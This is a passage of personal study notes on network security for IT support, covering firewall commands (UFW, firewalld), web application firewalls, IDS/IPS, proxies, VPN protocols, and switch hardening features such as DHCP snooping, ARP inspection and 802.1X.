generated](media/image751.png){width="6.5in"
height="7.375694444444444in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image752.png){width="6.5in"
height="4.514583333333333in"}

![Graphical user interface, application Description automatically
generated](media/image753.png){width="6.5in"
height="4.522222222222222in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image754.png){width="6.5in"
height="4.322222222222222in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image755.png){width="6.5in"
height="5.564583333333333in"}

######### Installation

Note: Pre-installed on some linux distros like Ubuntu.

![](media/image756.png){width="6.416666666666667in"
height="0.2916666666666667in"}

######### Usage

**Checking status**

![](media/image757.png){width="6.03125in" height="0.6979166666666666in"}

**Enable UFW**

![](media/image758.png){width="6.5in" height="0.5458333333333333in"}

**Clear all rules**

![](media/image759.png){width="6.5in" height="0.40694444444444444in"}

**Add a "deny" rule**

![Text Description automatically
generated](media/image760.png){width="6.5in"
height="1.7479166666666666in"}

**Add an "allow" rule**

![Text Description automatically generated with low
confidence](media/image761.png){width="6.5in"
height="2.435416666666667in"}

*\^ Above you can do by application name or port number.*

UFW needs to be enabled in order to use first.

Make sure to keep ssh enabled if you are connecting remotely!

sudo ufw allow ssh

Enabling mysql connections (default port)

sudo ufw alloq mysql

**Deleting a rule**

![A black background with white text Description automatically generated
with low confidence](media/image762.png){width="5.59375in"
height="1.7708333333333333in"}

######## Firewalld (Cetnt os 7+)

Command is called "firewall-cmd".

![Text Description automatically generated with low
confidence](media/image763.png){width="4.568682195975503in"
height="0.5901213910761155in"}

View zones

> ![](media/image764.png){width="6.5in" height="0.42430555555555555in"}

Default zone

![](media/image765.png){width="6.5in" height="0.5416666666666666in"}

######### Overview/Usage

![Graphical user interface, text, application, email Description
automatically generated](media/image766.png){width="5.490349956255468in"
height="1.250174978127734in"}

![Text Description automatically generated with medium
confidence](media/image767.png){width="5.84456583552056in"
height="6.8134503499562555in"}

###### Web Application Firewall (WAF)

Notes taken from:

<https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/>

**A WAF is a server on network specializing in protecting against
XSS/SQL injection attacks.**

A WAF or web
application [firewall](https://www.cloudflare.com/learning/security/what-is-a-firewall/) helps
protect web applications by filtering and
monitoring [HTTP](https://www.cloudflare.com/learning/ddos/glossary/hypertext-transfer-protocol-http/) traffic
between a web application and the Internet. It typically protects web
applications from attacks such as [cross-site
forgery](https://www.cloudflare.com/learning/security/threats/cross-site-request-forgery/), [cross-site-scripting
(XSS)](https://www.cloudflare.com/learning/security/threats/cross-site-scripting/),
file inclusion, and [SQL
injection](https://www.cloudflare.com/learning/security/threats/sql-injection/),
among others. A WAF is a protocol [layer
7](https://www.cloudflare.com/learning/ddos/what-is-layer-7/) defense
(in the [OSI
model](https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/)),
and is not designed to defend against all types of attacks. This method
of attack mitigation is usually part of a suite of tools which together
create a holistic defense against a range of attack vectors.

By deploying a WAF in front of a web application, a shield is placed
between the web application and the Internet. While a proxy server
protects a client machine's identity by using an intermediary, a WAF is
a type
of [reverse-proxy](https://www.cloudflare.com/learning/cdn/glossary/reverse-proxy/),
protecting the server from exposure by having clients pass through the
WAF before reaching the server.

A WAF operates through a set of rules often called policies. These
policies aim to protect against vulnerabilities in the application by
filtering out malicious traffic. The value of a WAF comes in part from
the speed and ease with which policy modification can be implemented,
allowing for faster response to varying attack vectors; during a [DDoS
attack](https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack),
rate limiting can be quickly implemented by modifying WAF policies.

A WAF can be implemented one of three different ways, each with its own
benefits and shortcomings:

-   **A network-based WAF** is generally hardware-based. Since they are
    > installed locally they minimize latency, but network-based WAFs
    > are the most expensive option and also require the storage and
    > maintenance of physical equipment.

-   **A host-based WAF** may be fully integrated into an application's
    > software. This solution is less expensive than a network-based WAF
    > and offers more customizability. The downside of a host-based WAF
    > is the consumption of local server resources, implementation
    > complexity, and maintenance costs. These components typically
    > require engineering time, and may be costly.

-   **[Cloud](https://www.cloudflare.com/learning/cloud/what-is-the-cloud/)-based
    > WAFs** offer an affordable option that is very easy to implement;
    > they usually offer a turnkey installation that is as simple as a
    > change
    > in [DNS](https://www.cloudflare.com/learning/ddos/glossary/domain-name-system-dns/) to
    > redirect traffic. Cloud-based WAFs also have a minimal upfront
    > cost, as users pay monthly or annually for security as a service.
    > Cloud-based WAFs can also offer a solution that is [consistently
    > updated to protect against the newest
    > threats](https://developers.cloudflare.com/waf/managed-rulesets) without
    > any additional work or cost on the user's end. The drawback of a
    > cloud-based WAF is that users hand over the responsibility to a
    > third party, therefore some features of the WAF may be a black box
    > to them. (A cloud-based WAF is one type of cloud firewall; [learn
    > more about cloud
    > firewalls](https://www.cloudflare.com/learning/cloud/what-is-a-cloud-firewall/).)

Learn about Cloudfl

##### Firewall Filters: IDS and IPS Systems

In this video, you will learn to describe intrusion detection systems,
IDS, and how they are used to detect vulnerability exploits on a
network.

Describe intrusion prevention systems, IPS, and how they are used to
actively protect against vulnerability exploits on a network. \>\>

![Diagram Description automatically
generated](media/image768.png){width="6.5in" height="3.775in"}

###### The Difference between IDS and IPS Systems

![Table Description automatically
generated](media/image769.png){width="6.5in"
height="2.490972222222222in"}

**The placement of the device in the network.**

The IPS is going to be directly in-line in the middle of the stream of
network traffic. The IPS will be tapping our communication, while the
IDS is outside the direct line of communication. Meaning it\'s offline
or it just receives a copy of all traffic sent to the interface. The
[IDS is listening in what\'s called promiscuous]{.underline} mode and
analyzing the traffic. Most of the time, this won\'t cause any delay in
network traffic. An IPS, on the other hand, is an active system type.
Meaning it is usually configured to actively monitor network traffic and
to automatically defend the network if a threat is found. For example,
automatically creating an ACL, or access control list, to block traffic
that\'s been identified as malicious. [In passive mode, an IPS acts more
like an IDS]{.underline}. If a threat is found, it will notify the
administrator, and it will then be up to the administrator to take
action. An IDS won\'t normally take any action other than notifying the
administrator of a threat. An IDS might have a Web interface where the
administrator can see what has been found. IDS and IPS systems both use
the same detection mechanisms. They both can use signatures to detect
malicious traffic where signatures are basically patterns that can be
found in the payload of traffic. Both types of system can also use
anomaly-based detection. They will detect if protocol standards are not
being followed, indicating a threat. Or in the case of signature
detection, that someone is trying to exploit a vulnerability in the
network.

###### Four ways IDS and IPS systems detect threats

![Diagram Description automatically
generated](media/image770.png){width="6.5in"
height="4.233333333333333in"}

[IDS and IPS systems commonly use one of four ways to detect
threats]{.underline}.

1.  **Signature-Based** **detection**. IDS and IPS systems both
    **maintain a database of signatures** that are used for signature
    based detection. [These signatures describe common patterns of
    network traffic]{.underline} that may indicate the traffic contains
    some malware which warrants raising an alert.

2.  **Anomaly based detection** is another way to detect a threat in the
    network. Each network protocol goes about its work in a
    characteristic way. If we find traffic that does not follow the
    standards of its protocol, this may indicate a threat is present and
    an alert is raised. For example, if there are a lot of half open TCP
    sessions or HTTP traffic that\'s not arriving with the right header
    or arrives with an unexpectedly long header.

3.  **Policy-Based-detection.** This approach requires administrators to
    configure security policies according to organizational security
    policies and the network infrastructure. When an activity occurs
    that violates a security policy, an alert is triggered and sent to
    the system administrators.

###### Intrusion Detection System (IDS)

![Graphical user interface, text, application, email Description
automatically generated](media/image771.png){width="6.5in"
height="3.5194444444444444in"}

An **intrusion detection system** (IDS) is an application that monitors
system activity and alerts on possible intrusions. An IDS alerts
administrators based on the signature of malicious traffic.

The IDS is configured to detect known attacks. IDS systems often sniff
data packets as they move across the network and analyze them for the
characteristics of known attacks. Some IDS systems review not only for
signatures of known attacks, but also for anomalies that could be the
sign of malicious activity. When the IDS discovers an anomaly, it sends
an alert to the network administrator who can then investigate further.

The limitations to IDS systems are that they can only scan for known
attacks or obvious anomalies. New and sophisticated attacks might not be
caught. The other limitation is that the IDS doesn't actually stop the
incoming traffic if it detects something awry. It's up to the network
administrator to catch the malicious activity before it does anything
damaging to the network. 

![An IDS circled above an image of a switch, which rests between a
firewall and the network.](media/image772.png){width="6.5in"
height="1.3375in"}

When combined with a firewall, an IDS adds another layer of defense. The
IDS is placed behind the firewall and before entering the LAN, which
allows the IDS to analyze data streams after network traffic that is
disallowed by the firewall has been filtered out. This is done to reduce
noise in IDS alerts, also referred to as false positives.

This is a symbolic representation of a Juniper brand firewall. Many
modern firewalls and network devices have a control plane and a
forwarding plane similar to this. The forwarding plane is in charge of
forwarding all traffic and making all the routing decisions, the policy
evaluations, the session matching, and so forth. This is done in a
manner that does not interrupt the control plane, which is in charge of
running the operating system which controls the device and the routing
table. If something happens to the control plane, the device will still
forward traffic since the forwarding plane will still be running.

Let\'s talk a little about **IDS, or intrusion detection systems**. An
IDS is a network security technology that is designed to detect
vulnerabilities and exploits against targeted servers, applications, or
a computer within our organization. By default, IDS just listens to
traffic. It doesn\'t take any action.

In most cases, an IDS is a dedicated server that\'s connected to a port
on a switch. The switch forwards a copy of all traffic flowing through
it to its IDS. The IDS monitors the traffic looking for anomalous
behavior, and when found, sends an alert to the administrator. While an
IDS won\'t take any action by default, modern IDSs can be configured to
run scripts that can send a command to the router to block an IP address
if an anomaly is detected. But normally, an IDS will just send an alert
to an administrator to let the administrator know that something
anomalous is happening in our network. And then it\'s up to the
administrator to initiate any required action.

####### IDS: Network-based vs Host-based

1.  **HIDS**. There are also ***host based intrusion detection
    systems***, or **HIDS**. These are software based applications
    designed to protect the computer they\'re installed on against
    attack. The HIDS listens to the traffic being received by and sent
    from the end point, which triggers an alert or actions as
    appropriate.

2.  **NIDS**. A ***network-based IDS*** listens to a copy of network
    traffic from a port mirror configured to the core switch, while a
    ***network-based IPS*** sits in the middle of the stream of traffic,
    both trying to find anomalies in the data stream. The main
    difference between a host-based and a network-based system is that
    the host-based system is a piece of software installed on an
    endpoint machine. While the network-based system is a piece of
    hardware that listens to all traffic that is sent to it or flows
    through it.

We covered Packet Capture and Analysis, which is related to our next
topic, Intrusion Detection and Prevention Systems or IDS/IPS. IDS or IPS
systems operate by monitoring network traffic and analyzing it. As an IT
support specialist, you may need to support the underlying platform that
the IDS/IPS runs on. You might also need to maintain the system itself,
ensuring that rules are updated, and you may even need to respond to
alerts. So, what exactly do IDS and IPS systems do? They look for
matching behavior or characteristics that would indicate malicious
traffic. The difference between an IDS and an IPS system, is that IDS is
only a detection system. It won\'t take action to block or prevent an
attack, when one is detected, it will only log an alert. But an IPS
system can adjust firewall rules on the fly, to block or drop the
malicious traffic when it\'s detected. IDS and IPS system can either be
host based or network based. In the case of a Network Intrusion
Detection System or NIDS, the detection system would be deployed
somewhere on a network, where it can monitor traffic for a network
segment or sub net. A host based intrusion detection system would be a
software deployed on the host that monitors traffic to and from that
host only. It may also monitor system files for unauthorized changes.
NIDS systems resemble firewalls in a lot of ways. But a firewall is
designed to prevent intrusions by blocking potentially malicious traffic
coming from outside, and enforce ACLs between networks. NIDS systems are
meant to detect and alert on potential malicious activity coming from
within the network. Plus, firewalls only have visibility of traffic
flowing between networks they\'ve set up to protect. They generally
wouldn\'t have visibility of traffic between hosts inside the network.
So, the location of the NIDS must be considered carefully when you
deploy a system. It needs to be located in the network topology, in a
way that it has access to the traffic we\'d like to monitor.

![Diagram Description automatically
generated](media/image773.png){width="6.5in"
height="3.4791666666666665in"}

A good way that you can get access to network traffic is using the port
mirroring functionality found in many enterprise switches. This allows
all packets on a port, port range, or entire VLAN to be mirrored to
another port, where NIDS host would be connected. With this
configuration, our NIDS machine would be able to see all packets flowing
in and out of hosts on the switch segment. This lets us monitor host to
host communications, and traffic from hosts to external networks, like
the internet. The NIDS hosts would analyzed this traffic by enabling
promiscuous mode on the analysis port. This is the network interface
that\'s connected to the mirror port on our switch, so it can see all
packets being passed, and perform an analysis on the traffic. Since this
interface is used for receiving mirrored packets from the network we\'d
like to monitor, a NIDS host must have at least two network interfaces.
One is for monitoring an analysis, and a separate one is for connecting
to our network for management and administrative purposes. Some popular
NID or NIP systems are Snort, Suricata, and Bro NIDS, which you can read
about more in the supplementary readings. Placement of a NIP system or
Network Intrusion Prevention system, would differ from a NIDS system.
This is because of a prevention system being able to take action against
a suspected malicious traffic. In order for a NIPS device to block or
drop traffic from a detected threat, it must be placed in line with the
traffic being monitored. This means, that the traffic that\'s being
monitored must pass through the NIPS device. If it wasn\'t the case, the
NIPS host wouldn\'t be able to take action on suspected traffic. Think
of it this way, a NIDS device is a passive observer that only watches
the traffic, and sends an alert if it sees something. This is unlike a
NIPS device, which not only monitors traffic, but can take action on the
traffic it\'s monitoring, usually by blocking or dropping the traffic.
The detection of threats or malicious traffic is usually handled through
signature based detection, similar to how antivirus software detects
malware. As an IT Support Specialist, you might be in charge of
maintaining the IDS or IPS setup, which would include ensuring that
rules and signatures are up to date. Signatures are unique
characteristics of known malicious traffic. They might be specific
sequences of packets, or packets with certain values encoded in the
specific header field. This allows Intrusion Detection and Prevention
Systems from easily and quickly recognizing known bad traffic from
sources like botnets, worms, and other common attack vectors on the
internet. But similar to antivirus, less common are targeted attacks
might not be detected by a signature based system, since they\'re might
not be signatures developed for these cases. So, it\'s also possible to
create custom rules to match traffic that might be considered
suspicious, but not necessarily malicious. This would allow
investigators to look into the traffic in more detail to determine the
badness level. If the traffic is found to be malicious, a signature can
be developed from the traffic, and incorporate it into the system. What
actually happens when a NIDS system detects something malicious? This is
configurable, but usually the NIDS system would log the detection event
along with a full packet capture of the malicious traffic. An alert
would also usually be triggered to notify the investigating team to look
into that detected traffic. Depending on the severity of the event, the
alert may just email a group, or create a ticket to follow up on, or it
might page someone in the middle of the night if it\'s determined to be
a really high severity and urgent. These alerts would usually also
include reference information linking to a known vulnerability, or some
more information about the nature of the alert to help the investigator
look into the event. Well, we covered a lot of ground on securing your
networks. I hope you feel secure enough to move on. If not, you can
review any of these concepts that we\'ve talked about. Once you\'ve done
that, it\'s time for a peer review assessment, to give you some hands on
experience with packet sniffing analysis. When you\'re finished, I\'ll
see you in the next video, where we\'ll cover defense in depth.

###### Intrusion Prevention System (IPS)

![Graphical user interface, text, application Description automatically
generated](media/image774.png){width="6.5in"
height="2.698611111111111in"}

An **intrusion prevention system (IPS)** is an application that monitors
system activity for intrusive activity and takes action to stop the
activity. It offers even more protection than an IDS because it actively
stops anomalies when they are detected, unlike the IDS that simply
reports the anomaly to a network administrator.

An IPS searches for signatures of known attacks and data anomalies. An
IPS reports the anomaly to security analysts and blocks a specific
sender or drops network packets that seem suspect. 

![An IPS is situated between a firewall and the internal
network.](media/image775.png){width="6.5in"
height="1.0166666666666666in"}

The IPS (like an IDS) sits behind the firewall in the network
architecture. This offers a high level of security because risky data
streams are disrupted before they even reach sensitive parts of the
network. However, one potential limitation is that it is inline: If it
breaks, the connection between the private network and the internet
breaks. Another limitation of IPS is the possibility of false positives,
which can result in legitimate traffic getting dropped.

![Graphical user interface Description automatically
generated](media/image776.png){width="6.5in"
height="3.3055555555555554in"}

Now let\'s move on to **intrusion prevention systems, or IPS** for
short. [The primary difference between an IDS and an IPS is that an IPS
is designed to take action on its own when an anomaly or an offense is
detected in the network]{.underline}. Another difference is that the
[IPS does not just listen to a copy of the network traffic, but all
traffic must pass through it before it\'s allowed to move
on.]{.underline} One disadvantage is that it adds a delay to the flow of
network traffic. An IPS is usually positioned right after a router, edge
device, or firewall, and some firewalls are designed to also function as
an IPS. Unlike intrusion detection systems, an IPS is not a passive
listener. It\'s going to be an active listener and it can take action if
an anomaly is found in our network.

##### Securing Network software

Hey, welcome back. In the last lesson, we covered network hardware
hardening security measures. Which you should be aware of as an IT
support specialist. Now, we\'re going to shift to network software
hardening techniques. Just like with network hardware hardening, it is
important for you to know how to implement network software hardening,
which includes things like firewalls, proxies, and VPNs. These security
software solutions will play an important role in securing networks and
their traffic for your organization.

###### [Securing SSH connection]{.smallcaps}

[Click here for bookmarked content.](#_SSH_and_Remote)

###### Syslog/Logging

![A picture containing text, hard disc Description automatically
generated](media/image777.png){width="6.5in"
height="3.4131944444444446in"}

![Graphical user interface, text, application, chat or text message
Description automatically generated](media/image778.png){width="6.5in"
height="4.614583333333333in"}

![Text Description automatically
generated](media/image779.png){width="4.755204505686789in"
height="3.599425853018373in"}

###### Proxy Service

Proxies come in many other flavors, way too many for us to cover them
all here. But the most important takeaway is that proxies are any server
that act as a intermediary between a client and another server.

-   **Proxy server**: A server that fulfills the requests of its clients
    by forwarding them to other servers

-   **Forward proxy server**: A server that regulates and restricts a
    person's access to the internet

-   **Reverse proxy server**: A server that regulates and restricts the
    internet\'s access to an internal server

![Graphical user interface, text, application Description automatically
generated](media/image780.png){width="5.791666666666667in"
height="1.6694356955380578in"}

![Diagram Description automatically
generated](media/image781.png){width="6.5in"
height="3.696527777777778in"}

![Graphical user interface, text, application Description automatically
generated](media/image782.png){width="5.255688976377953in"
height="2.078692038495188in"}

A form of load balancing like DNS round robin

![Diagram Description automatically
generated](media/image783.png){width="6.5in"
height="2.8847222222222224in"}

Proxies can be really useful to protect client devices and their
traffic. They also provide secure remote access without using a VPN. A
standard web proxy can be configured for client devices. This allows web
traffic to be proxied through a proxy server that we control for lots of
purposes. This configuration can be used for logging web requests of
client devices. The devices can be used for logs, and traffic analysis,
and forensic investigation. The proxy server can be configured to block
content that might be malicious, dangerous, or just against company
policy.

![Text Description automatically
generated](media/image784.png){width="6.5in"
height="2.686111111111111in"}

A **reverse proxy** can be configured to allow secure remote access to
web based services without requiring a VPN. Now, as an IT. support
specialist, you may need to configure or maintain a reverse proxy
service as an alternative to VPN. By configuring a reverse proxy at the
edge of your network, connection requests to services inside the network
coming from outside, are intercepted by the reverse proxy. They are then
forwarded on to the internal service with the reverse proxy acting as a
relay. This bridges communications between the remote client outside the
network and the internal service. This proxy setup can be secured even
more by requiring the use of client TLS certificates, along with
username and password authentication. Specific ACLs can also be
configured on the reverse proxy to restrict access even more. Lots of
popular proxy solutions support a reverse proxy configuration like
HAProxy, Nginx, and even the Apache Web Server. You can read more about
these popular proxy solutions in the supplemental readings. Next up,
let\'s take a practice quiz to secure the network architecture terms
we\'ve just discussed.

***Comparing proxy vs reverse proxy***

![Diagram Description automatically
generated](media/image785.png){width="6.5in"
height="5.241666666666666in"}

Note: VPNs, Proxies, and SSH all fight against man-in-the-middle
attacks.

###### VPN (transport layer)

![Graphical user interface, text Description automatically
generated](media/image786.png){width="4.458333333333333in"
height="1.5265977690288715in"}

**Is a tunneling protocol.**

VPNs are commonly used to provide secure remote access, and link two
networks securely. Let\'s say we have two offices located in buildings
that are on opposite sides of town. We want to create one unified
network that would let users in each location, seamlessly connect to
devices and services in either location. We could use a site to site VPN
to link these two offices. To the people in the offices, everything
would just work. They\'d be able to connect to a service hosted in the
other office without any specific configuration. Using a VPN tunnel, all
traffic between the two offices can be secured using encryption. This
lets the two remote networks join each other seamlessly. This way,
clients on one network can access devices on the other without requiring
them to individually connect to a VPN service. Usually, the same
infrastructure can be used to allow remote access VPN services for
individual clients that require access to internal resources while out
of the office.

Most VPNs work by using the payload section of the transport layer to
carry an encrypted payload that actually contains an entire second set
of packets. The network, the transport and the application layers of a
packet intended to traverse the remote network.

Basically, this payload is carried to the VPNs end point where all the
other layers are stripped away and discarded. Then the payload is
unencrypted, leaving the VPN server with the top three layers of a new
packet. This gets encapsulated with the proper data link layer
information and sent out across the network. This process is completed
in the inverse, in the opposite direction.

*Lecture...*

Let\'s talk about securing network traffic. As we\'ve seen, encryption
is used for protecting data both from the privacy perspective and the
data integrity perspective. A natural application of this technology is
to protect data in transit, but what if our application doesn\'t utilize
encryption? Or what if we want to provide remote access to internal
resources too sensitive to expose directly to the Internet? We use a
VPN, or Virtual Private Network solution. A VPN is a mechanism that
allows you to remotely connect a host or network to an internal private
network, passing the data over a public channel, like the Internet. You
can think of this as a sort of **encrypted tunnel** where all of our
remote system\'s network traffic would flow, transparently channeling
our packets via the tunnel through the remote private network. A

VPN can also be **point-to-point**, where two gateways are connected via
a VPN. Essentially bridging two private networks through an encrypted
tunnel. There are a bunch of VPN solutions using different approaches
and protocols with differing benefits and tradeoffs. Let\'s go over some
of the more popular ones.

**IPsec**, or **Internet Protocol Security**, is a VPN protocol that was
designed in conjunction with IPv6. It was originally required to be
standards compliant with IPv6 implementations, but was eventually
dropped as a requirement. It is optional for use with IPv6. IPsec works
by encrypting an IP packet and encapsulating the encrypted packet inside
an IPsec packet. This encrypted packet then gets routed to the VPN
endpoint where the packet is de-encapsulated and decrypted then sent to
the final destination.

![Diagram Description automatically
generated](media/image787.png){width="6.5in"
height="2.4305555555555554in"}

IPsec supports two modes of operations, **transport mode and tunnel**
mode. When ***transport mode*** is used, only the payload of the IP
packet is encrypted, leaving the IP headers untouched. Heads up that
authentication headers are also used. Header values are hashed and
verified, along with the transport and application layers. This would
prevent the use of anything that would modify these values, like NAT or
PAT. In ***tunnel mode***, the entire IP packet, header, payload, and
all, is encrypted and encapsulated inside a new IP packet with new
headers.

While not a VPN solution itself, **L2TP**, or **Layer 2 Tunneling
Protocol**, is typically used to support VPNs. A common implementation
of L2TP is in conjunction with IPsec when data confidentially is needed,
since L2TP doesn\'t provide encryption itself. It\'s a simple tunneling
protocol that allows encapsulation of different protocols or traffic
over a network that may not support the type of traffic being sent. L2TP
can also just segregate and manage the traffic. ISPs will use the L2TP
to deliver network access to a customer\'s endpoint, for example. The
combination of L2TP and IPsec is referred to as L2TP IPsec and was
officially standardized in ietf RFC 3193. The establishment of an L2TP
IPsec connection works by first negotiating an IPsec security
association. Which negotiates the details of the secure connection,
including key exchange, if used. It can also share secrets, public keys,
and a number of other mechanisms. I\'ve included a link to more info
about it in the next reading. Next, secure communication is established
using Encapsulating Security Payload. It\'s a part of the IPsec suite of
protocols, which encapsulates IP packets, providing confidentiality,
integrity, and authentication of the packets. Once secure encapsulation
has been established, negotiation and establishment of the L2TP tunnel
can proceed. L2TP packets are now encapsulated by IPsec, protecting
information about the private internal network. An important distinction
to make in this setup is the difference between the tunnel and the
secure channel. The tunnel is provided by L2TP, which permits the
passing of unmodified packets from one network to another. The secure
channel, on the other hand, is provided by IPsec, which provides
confidentiality, integrity, and authentication of data being passed.

**SSL TLS** is also used in some VPN implementations to secure network
traffic, as opposed to individual sessions or connections. An example of
this is OpenVPN, which uses the OpenSSL library to handle key exchange
and encryption of data, along with control channels. This also enables
OpenVPN to make use of all the cyphers implemented by the OpenSSL
library. Authentication methods supported are pre-shared secrets,
certificate-based, and username password. Certificate-based
authentication would be the most secure option, but it requires more
support and management overhead since every client must have a
certificate. Username and password authentication can be used in
conjunction with certificate authentication, providing additional layers
of security. It should be called out that OpenVPN doesn\'t implement
username and password authentication directly. It uses modules to plug
into authentication systems, which we\'ll cover in the next module.
OpenVPN can operate over either TCP or UDP, typically over port 1194. It
supports pushing network configuration options from the server to a
client and it supports two interfaces for networking. It can either rely
on a Layer 3 IP tunnel or a Layer 2 Ethernet tap. The Ethernet tap is
more flexible, allowing it to carry a wider range of traffic. From the
security perspective, OpenVPN supports up to 256-bit encryption through
the OpenSSL library. It also runs in user space, limiting the
seriousness of potential vulnerabilities that might be present. There
are a lot of acronyms to take in, so take a minute to go over them and
read more about them, and I\'ll see you in the next video.

![Text Description automatically
generated](media/image788.png){width="6.5in"
height="2.6479166666666667in"}

![Graphical user interface, text, application, letter Description
automatically generated](media/image789.png){width="6.5in"
height="2.6152777777777776in"}

####### Point-to-Point VPN

A point-to-point VPN, also called a site-to-site VPN, establishes a VPN
tunnel between two sites. This operates a lot like the way that a
traditional VPN setup lets individual users act as if they are on the
network they\'re connecting to. It\'s just that the VPN tunneling logic
is handled by network devices at either side, so that users don\'t all
have to establish their own connections. Now, it\'s time for one more
quiz to see how your connections are firing.

###### misc/how to

<https://openvpn.net/what-is-a-vpn/>

Using OpenVPN

1.  Install OpenVPN

2.  Import config file provided by employer

3.  Login with openvpn credentials

    a.  An employer provided config file not only masks your IP, but it
        gives you access to the employers network and all connected
        devices/machines.

<https://www.youtube.com/watch?v=DbBR_U70rTo>

<https://www.youtube.com/watch?v=jMv29ZQ7huQ>

<https://www.youtube.com/watch?v=9LNC393pqyE>

**Sample config file**:
<https://github.com/OpenVPN/openvpn/blob/master/sample/sample-config-files/client.conf>

<https://openvpn.net/community-resources/how-to/>

##### Securing Network Hardware and Architecture

###### DMZ

A demilitarized zone (DMZ) exposes a LAN host to the Internet.

![A blue screen with white text Description automatically generated with
medium confidence](media/image790.png){width="4.189191819772528in"
height="2.361791338582677in"}

![Graphical user interface, text Description automatically
generated](media/image791.png){width="4.246720253718285in"
height="1.2985159667541557in"}

![Text, application Description automatically
generated](media/image792.png){width="4.433079615048119in"
height="2.2752690288713913in"}

![Diagram Description automatically
generated](media/image793.png){width="6.5in"
height="5.079166666666667in"}

![Graphical user interface, text Description automatically
generated](media/image794.png){width="6.5in"
height="1.636111111111111in"}

![Graphical user interface, text, application Description automatically
generated](media/image795.png){width="6.5in"
height="2.265972222222222in"}

###### DHCP snooping

In an earlier lesson on networking, we explored DHCP. It\'s the protocol
where devices on a network are assigned critical configuration
information for communicating on the network. You also learned about
configuring DHCP in another course of this program. So, you can see how
DHCP is a target of attackers because of the important nature of the
service it provides. If an attacker can manage to deploy a rogue DHCP
server on your network, they could hand out DHCP leases with whatever
information they want. This includes setting a gateway address or DNS
server, that\'s actually a machine within their control. This gives them
access to your traffic and opens the door for future attacks. We call
this type of attack a rogue **DHCP server attack**. To protect against
this rogue DHCP server attack, enterprise switches offer a feature
called **DHCP snooping**. [A switch that has DHCP snooping will monitor
DHCP traffic being sent across it. It will also track IP assignments and
map them to hosts connected to switch ports]{.underline}. This basically
builds a map of assigned IP addresses to physical switch ports. This
information can also be used to protect against IP spoofing and ARP
poisoning attacks. DHCP snooping also makes you designate either a
trusted DHCP server IP, if it\'s operating as a DHCP helper, and
forwarding DHCP requests to the server, or you can enable DHCP snooping
trust on the uplinked port, where legitimate DHCP responses would now
come from. Now any DHCP responses coming from either an untrusted IP
address or from a downlinked switch port would be detected as untrusted
and discarded by the switch.

###### Dynamic ARP inspection (DAI) -- switch-based ARP-spoof protection

Let\'s talk about another form of network hardware hardening, Dynamic
ARP inspection. We covered ARP earlier from the how does it function
standpoint. ARP allows for a layer to men-in-the-middle attack because
of the unauthenticated nature of ARP. It allows an attacker to forge an
ARP response, advertising its MAC address as the physical address
matching a victim\'s IP address. This type of ARP response is called a
**gratuitous ARP response**, since it\'s effectively answering a query
that no one made. When this happens, all of the clients on the local
network segment would cache this ARP entry. Because of the forged ARP
entry, they send frames intended for the victim\'s IP address to the
attacker\'s machine instead. The attacker could enable IP forwarding,
which would let them transparently monitor traffic intended for the
victim. They could also manipulate or modify data. **Dynamic ARP
inspection or DAI** is another feature on enterprise switches that
prevents this type of attack. [It requires the use of DHCP snooping to
establish a trusted binding of IP addresses to switch
ports]{.underline}. DAI will detect these forged gratuitous ARP packets
and drop them. It does this because it has a table from DHCP snooping
that has the authoritative IP address assignments per port. DAI also
enforces great limiting of ARP packets per port to prevent ARP scanning.
An attacker is likely to ARP scan before attempting the ARP attack.

###### IP source guard (IPSG)

To prevent IP spoofing attacks, **IP source guard or IPSG** can be
enabled on enterprise switches along with DHCP snooping. If you\'re an
IT Support Specialist at a small company that uses enterprise-class
switch hardware, you\'ll probably utilize IPSG. It works by using the
DHCP snooping table to dynamically create ACLs for each switchboard.
This drops packets that don\'t match the IP address for the port based
on the DHCP snooping table.

###### 802.1X and EAP-TLS

Now, if you really want to lock down your network, you can implement
802.1X. We\'ve added details about how to configure this in the
supplementary reading. But for now, let\'s discuss this at a high level.
It\'s important for an IT Support Specialist to be aware of 802.1X. This
is the IEEE standard for encapsulating EAP or Extensible Authentication
Protocol traffic over the 802 networks. This is also called EAP over LAN
or EAPOL, it was originally designed for Ethernet but support was added
for other network types like Wi-Fi and fiber networks. We won\'t go into
the details of all EAP authentication types supported. There are about
100 compatible types, so it would take way too long. But we\'ll take a
closer look at **EAP-TLS** since it\'s one of the more common and secure
EAP methods. When a client wants to authenticate to a network using
802.1X, there are three parties involved. The client device is what we
call the supplicant. It\'s sometimes also used to refer to the software
running on the client machine that handles the authentication process
for the user. The open source Linux utility wpa_supplicant is one of
those. The supplicant communicates with the authenticator, which acts as
a sort of gatekeeper for the network. It requires clients to
successfully authenticate to the network before they\'re allowed to
communicate with the network. This is usually an enterprise switch or an
access point in the case of wireless networks. It\'s important to call
out that while the supplicant communicates with the authenticator, it\'s
not actually the authenticator that makes the authentication decision.
The authenticator acts like a go between and forwards the authentication
request to the authentication server. That\'s where the actual
credential verification and authentication occurs. The authentication
server is usually a RADIUS server. [**EAP-TLS** is an authentication
type supported by EAP that uses TLS to provide mutual authentication of
both the client and the authenticating server]{.underline}. This is
considered one of the more secure configurations for wireless security,
so it\'s definitely possible that you\'ll encounter this authentication
type in your IT career. Like with many of these protocols, understanding
how it works can help you if you need to troubleshoot. You might
remember from Course 4 that HTTPS is a combination of the hypertext
transfer protocol, HTTP, with SSL-TLS cryptographic protocols. When TLS
is implemented for HTTPS traffic, it specifies a client\'s certificate
as an optional factor of authentication. Similarly, most EAP-TLS
implementations require client-side certificates. Authentication can be
certificate-based, which requires a client to present a valid
certificate that\'s signed by the authenticating CA, or a client can use
a certificate in conjunction with a username, password, and even a
second factor of authentication, like a one-time password. The security
of EAP-TLS stems from the inherent security that the TLS protocol and
PKI provide. That also means that the pitfalls are the same when it
comes to properly managing PKI elements. You have to safeguard private
keys appropriately and ensure distribution of the CA certificate to
client devices to allow verification of the server-side. Even more
secure configuration for EAP-TLS would be to bind the client-side
certificates to the client platforms using TPMs. This would prevent
theft of the certificates from client machines. When you combine this
with FDE, even theft of a computer would prevent compromise of the
network. We\'re covering a lot of complex processes right now, so feel
free to watch this video again so that the material really sinks in. If
you\'re really interested in implementing these processes yourself or
want to dive into even more details about how it all works, check out
the supplementary readings for this lesson. Keep in mind, as an IT
Support Specialist, you don\'t need to know every single step-by-step
